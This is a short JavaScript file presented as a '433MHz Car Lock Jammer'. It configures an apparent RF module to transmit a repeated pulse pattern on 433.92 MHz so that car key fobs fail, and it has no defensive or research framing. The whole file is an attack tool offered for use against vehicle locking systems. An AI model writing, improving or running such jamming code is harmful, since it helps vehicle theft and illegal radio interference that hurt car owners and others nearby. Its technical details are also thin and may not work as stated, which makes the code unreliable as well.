// RF 433MHz Car Lock Jammer
// Advanced jamming for car key fobs
// Configure frequency and modulation before use

const RF433 = require('rf433');
const jammer = new RF433();

// Configuration
const FREQUENCY = 433.92; // MHz
const MODULATION = 'ASK';
const PULSE_WIDTH = 350; // microseconds
const REPEAT = 1000; // times

jammer.setFrequency(FREQUENCY);
jammer.setModulation(MODULATION);
jammer.setPulseWidth(PULSE_WIDTH);

// Jamming pattern
const jamPattern = [
    { duration: 100, level: 1 },
    { duration: 50, level: 0 },
    { duration: 100, level: 1 },
    { duration: 50, level: 0 }
];

console.log('Starting car lock jammer...');
jammer.transmit(jamPattern, REPEAT);
console.log('Jamming completed');
